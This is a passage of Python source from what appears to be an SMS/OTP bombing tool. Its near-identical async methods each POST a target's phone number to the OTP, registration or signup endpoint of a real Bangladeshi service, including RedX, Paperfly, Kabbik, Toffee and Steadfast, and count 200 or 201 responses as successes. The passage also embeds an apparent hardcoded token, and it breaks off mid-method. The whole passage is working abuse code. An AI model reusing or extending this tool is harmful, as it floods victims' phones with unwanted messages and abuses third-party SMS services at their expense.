                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL026 app.eonbazar.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL026 app.eonbazar.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl027_fundesh_com_bd(self):
        target = self.target
        url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL027 fundesh.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL027 fundesh.com.bd": pass
            elif "Bioscope" in "CURL027 fundesh.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL027 fundesh.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL027 fundesh.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL027 fundesh.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL027 fundesh.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL027 fundesh.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL027 fundesh.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL027 fundesh.com.bd": pass
            elif "BDSTall" in "CURL027 fundesh.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL027 fundesh.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL027 fundesh.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL027 fundesh.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL027 fundesh.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL027 fundesh.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL027 fundesh.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL027 fundesh.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL027 fundesh.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL027 fundesh.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL027 fundesh.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL027 fundesh.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl028_go_app_paperfly_com_bd(self):
        target = self.target
        url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL028 go-app.paperfly.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL028 go-app.paperfly.com.bd": pass
            elif "Bioscope" in "CURL028 go-app.paperfly.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL028 go-app.paperfly.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL028 go-app.paperfly.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL028 go-app.paperfly.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL028 go-app.paperfly.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL028 go-app.paperfly.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL028 go-app.paperfly.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL028 go-app.paperfly.com.bd": pass
            elif "BDSTall" in "CURL028 go-app.paperfly.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL028 go-app.paperfly.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL028 go-app.paperfly.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL028 go-app.paperfly.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL028 go-app.paperfly.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL028 go-app.paperfly.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL028 go-app.paperfly.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL028 go-app.paperfly.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL028 go-app.paperfly.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL028 go-app.paperfly.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL028 go-app.paperfly.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL028 go-app.paperfly.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl029_api_kabbik_com(self):
        target = self.target
        url = "https://api.kabbik.com/v1/auth/otpnew2"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL029 api.kabbik.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL029 api.kabbik.com": pass
            elif "Bioscope" in "CURL029 api.kabbik.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL029 api.kabbik.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL029 api.kabbik.com": payload = {"phone": target}
            elif "Medha" in "CURL029 api.kabbik.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL029 api.kabbik.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL029 api.kabbik.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL029 api.kabbik.com": payload = {"mobile": target}
            elif "MyGP" in "CURL029 api.kabbik.com": pass
            elif "BDSTall" in "CURL029 api.kabbik.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL029 api.kabbik.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL029 api.kabbik.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL029 api.kabbik.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL029 api.kabbik.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL029 api.kabbik.com": payload = {"mobile": target}
            elif "Kirei" in "CURL029 api.kabbik.com": payload = {"phone": target}
            elif "Shikho" in "CURL029 api.kabbik.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL029 api.kabbik.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL029 api.kabbik.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL029 api.kabbik.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL029 api.kabbik.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl030_api_kormi24_com(self):
        target = self.target
        url = "https://api.kormi24.com/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL030 api.kormi24.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL030 api.kormi24.com": pass
            elif "Bioscope" in "CURL030 api.kormi24.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL030 api.kormi24.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL030 api.kormi24.com": payload = {"phone": target}
            elif "Medha" in "CURL030 api.kormi24.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL030 api.kormi24.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL030 api.kormi24.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL030 api.kormi24.com": payload = {"mobile": target}
            elif "MyGP" in "CURL030 api.kormi24.com": pass
            elif "BDSTall" in "CURL030 api.kormi24.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL030 api.kormi24.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL030 api.kormi24.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL030 api.kormi24.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL030 api.kormi24.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL030 api.kormi24.com": payload = {"mobile": target}
            elif "Kirei" in "CURL030 api.kormi24.com": payload = {"phone": target}
            elif "Shikho" in "CURL030 api.kormi24.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL030 api.kormi24.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL030 api.kormi24.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL030 api.kormi24.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL030 api.kormi24.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl031_api_motionview_com_bd(self):
        target = self.target
        url = "https://api.motionview.com.bd/api/send-otp-phone-signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL031 api.motionview.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL031 api.motionview.com.bd": pass
            elif "Bioscope" in "CURL031 api.motionview.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL031 api.motionview.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL031 api.motionview.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL031 api.motionview.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL031 api.motionview.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL031 api.motionview.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL031 api.motionview.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL031 api.motionview.com.bd": pass
            elif "BDSTall" in "CURL031 api.motionview.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL031 api.motionview.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL031 api.motionview.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL031 api.motionview.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL031 api.motionview.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL031 api.motionview.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL031 api.motionview.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL031 api.motionview.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL031 api.motionview.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL031 api.motionview.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL031 api.motionview.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL031 api.motionview.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl032_gateway_otithee_com(self):
        target = self.target
        url = "https://gateway.otithee.com/api/v1/generate-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL032 gateway.otithee.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL032 gateway.otithee.com": pass
            elif "Bioscope" in "CURL032 gateway.otithee.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL032 gateway.otithee.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL032 gateway.otithee.com": payload = {"phone": target}
            elif "Medha" in "CURL032 gateway.otithee.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL032 gateway.otithee.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL032 gateway.otithee.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL032 gateway.otithee.com": payload = {"mobile": target}
            elif "MyGP" in "CURL032 gateway.otithee.com": pass
            elif "BDSTall" in "CURL032 gateway.otithee.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL032 gateway.otithee.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL032 gateway.otithee.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL032 gateway.otithee.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL032 gateway.otithee.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL032 gateway.otithee.com": payload = {"mobile": target}
            elif "Kirei" in "CURL032 gateway.otithee.com": payload = {"phone": target}
            elif "Shikho" in "CURL032 gateway.otithee.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL032 gateway.otithee.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL032 gateway.otithee.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL032 gateway.otithee.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL032 gateway.otithee.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl033_prod_saralifestyle_com(self):
        target = self.target
        url = "https://prod.saralifestyle.com/api/Master/SendTokenV1"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL033 prod.saralifestyle.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL033 prod.saralifestyle.com": pass
            elif "Bioscope" in "CURL033 prod.saralifestyle.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL033 prod.saralifestyle.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL033 prod.saralifestyle.com": payload = {"phone": target}
            elif "Medha" in "CURL033 prod.saralifestyle.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL033 prod.saralifestyle.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL033 prod.saralifestyle.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL033 prod.saralifestyle.com": payload = {"mobile": target}
            elif "MyGP" in "CURL033 prod.saralifestyle.com": pass
            elif "BDSTall" in "CURL033 prod.saralifestyle.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL033 prod.saralifestyle.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL033 prod.saralifestyle.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL033 prod.saralifestyle.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL033 prod.saralifestyle.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL033 prod.saralifestyle.com": payload = {"mobile": target}
            elif "Kirei" in "CURL033 prod.saralifestyle.com": payload = {"phone": target}
            elif "Shikho" in "CURL033 prod.saralifestyle.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL033 prod.saralifestyle.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL033 prod.saralifestyle.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL033 prod.saralifestyle.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL033 prod.saralifestyle.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl034_api_redx_com_bd(self):
        target = self.target
        url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL034 api.redx.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL034 api.redx.com.bd": pass
            elif "Bioscope" in "CURL034 api.redx.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL034 api.redx.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL034 api.redx.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL034 api.redx.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL034 api.redx.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL034 api.redx.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL034 api.redx.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL034 api.redx.com.bd": pass
            elif "BDSTall" in "CURL034 api.redx.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL034 api.redx.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL034 api.redx.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL034 api.redx.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL034 api.redx.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL034 api.redx.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL034 api.redx.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL034 api.redx.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL034 api.redx.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL034 api.redx.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL034 api.redx.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL034 api.redx.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl035_api_rootsedulive_com(self):
        target = self.target
        url = "https://api.rootsedulive.com/v2/auth/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL035 api.rootsedulive.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL035 api.rootsedulive.com": pass
            elif "Bioscope" in "CURL035 api.rootsedulive.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL035 api.rootsedulive.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL035 api.rootsedulive.com": payload = {"phone": target}
            elif "Medha" in "CURL035 api.rootsedulive.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL035 api.rootsedulive.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL035 api.rootsedulive.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL035 api.rootsedulive.com": payload = {"mobile": target}
            elif "MyGP" in "CURL035 api.rootsedulive.com": pass
            elif "BDSTall" in "CURL035 api.rootsedulive.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL035 api.rootsedulive.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL035 api.rootsedulive.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL035 api.rootsedulive.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL035 api.rootsedulive.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL035 api.rootsedulive.com": payload = {"mobile": target}
            elif "Kirei" in "CURL035 api.rootsedulive.com": payload = {"phone": target}
            elif "Shikho" in "CURL035 api.rootsedulive.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL035 api.rootsedulive.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL035 api.rootsedulive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL035 api.rootsedulive.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL035 api.rootsedulive.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl036_steadfast_com_bd(self):
        target = self.target
        url = "https://steadfast.com.bd/register/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL036 steadfast.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL036 steadfast.com.bd": pass
            elif "Bioscope" in "CURL036 steadfast.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL036 steadfast.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL036 steadfast.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL036 steadfast.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL036 steadfast.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL036 steadfast.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL036 steadfast.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL036 steadfast.com.bd": pass
            elif "BDSTall" in "CURL036 steadfast.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL036 steadfast.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL036 steadfast.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL036 steadfast.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL036 steadfast.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL036 steadfast.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL036 steadfast.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL036 steadfast.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL036 steadfast.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL036 steadfast.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL036 steadfast.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL036 steadfast.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl037_suzuki_com_bd(self):
        target = self.target
        url = "https://suzuki.com.bd/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL037 suzuki.com.bd": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL037 suzuki.com.bd": pass
            elif "Bioscope" in "CURL037 suzuki.com.bd": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL037 suzuki.com.bd": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL037 suzuki.com.bd": payload = {"phone": target}
            elif "Medha" in "CURL037 suzuki.com.bd": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL037 suzuki.com.bd": payload = {"number": "+88" + target}
            elif "Robi" in "CURL037 suzuki.com.bd": payload = {"phone_number": target}
            elif "Arogga" in "CURL037 suzuki.com.bd": payload = {"mobile": target}
            elif "MyGP" in "CURL037 suzuki.com.bd": pass
            elif "BDSTall" in "CURL037 suzuki.com.bd": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL037 suzuki.com.bd": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL037 suzuki.com.bd": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL037 suzuki.com.bd": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL037 suzuki.com.bd": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL037 suzuki.com.bd": payload = {"mobile": target}
            elif "Kirei" in "CURL037 suzuki.com.bd": payload = {"phone": target}
            elif "Shikho" in "CURL037 suzuki.com.bd": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL037 suzuki.com.bd": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL037 suzuki.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL037 suzuki.com.bd", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL037 suzuki.com.bd", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl038_prod_services_toffeelive_com(self):
        target = self.target
        url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL038 prod-services.toffeelive.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL038 prod-services.toffeelive.com": pass
            elif "Bioscope" in "CURL038 prod-services.toffeelive.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL038 prod-services.toffeelive.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL038 prod-services.toffeelive.com": payload = {"phone": target}
            elif "Medha" in "CURL038 prod-services.toffeelive.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL038 prod-services.toffeelive.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL038 prod-services.toffeelive.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL038 prod-services.toffeelive.com": payload = {"mobile": target}
            elif "MyGP" in "CURL038 prod-services.toffeelive.com": pass
            elif "BDSTall" in "CURL038 prod-services.toffeelive.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
